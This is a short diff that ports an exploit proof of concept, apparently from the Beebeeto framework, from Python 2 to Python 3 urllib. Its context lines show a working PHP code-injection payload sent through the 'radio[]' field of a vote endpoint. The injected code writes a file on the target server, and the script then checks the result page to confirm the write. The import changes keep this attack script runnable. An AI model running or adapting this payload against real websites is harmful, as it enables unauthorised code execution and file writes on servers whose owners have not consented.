@@ -8,8 +8,8 @@ http://www.beebeeto.com/pdb/poc-2015-0086/
 """
 
 import re
-import urllib
-import urllib2
+import urllib.request, urllib.parse, urllib.error
+import urllib.request, urllib.error, urllib.parse
 import base64
 import random
 
@@ -42,7 +42,7 @@ def audit(args):
             exploit_url = '%sindex.php?m=vote&c=index&a=post&subjectid=%s&siteid=1' % (vul_url, i)
             payload = {'subjectid': 1,
                        'radio[]': ');fputs(fopen(base64_decode(%s),w),"vulnerable test");' % base64_name}
-            post_data = urllib.urlencode(payload)
+            post_data = urllib.parse.urlencode(payload)
             code,head,body,_,_=curl.curl('-d "%s" %s' % (post_data, exploit_url))
             if code==200:
                 verify_url = '%sindex.php?m=vote&c=index&a=result&subjectid=%s&siteid=1' % (vul_url, i)
